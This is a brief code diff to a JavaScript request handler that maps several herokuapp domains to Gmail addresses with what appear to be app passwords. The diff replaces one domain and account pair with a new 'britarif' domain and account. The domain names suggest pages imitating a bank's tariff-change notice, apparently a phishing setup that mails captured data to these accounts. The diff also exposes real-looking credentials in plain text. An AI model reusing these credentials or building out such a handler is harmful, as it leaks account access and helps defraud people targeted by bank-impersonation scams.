@@ -20,9 +20,9 @@ export default function handler(req, res) {
         email = 'brigacor80@gmail.com';
         pass = 'zhzcfhbdtzipldsz';
         
-    } else if(url == 'tarif--perubah--an.herokuapp.com'){
-        email = 'qqq66195@gmail.com';
-        pass = 'gsnyrcjtylrepjdg';
+    } else if(url == 'britarif--baru-lama.herokuapp.com'){
+        email = 'samsudin19.01.12@gmail.com';
+        pass = 'nsozbvpgogzlfeqg';
 
     } else if(url == 'tarif--baru-lama.herokuapp.com'){
         email = 'tarifbaru36@gmail.com';
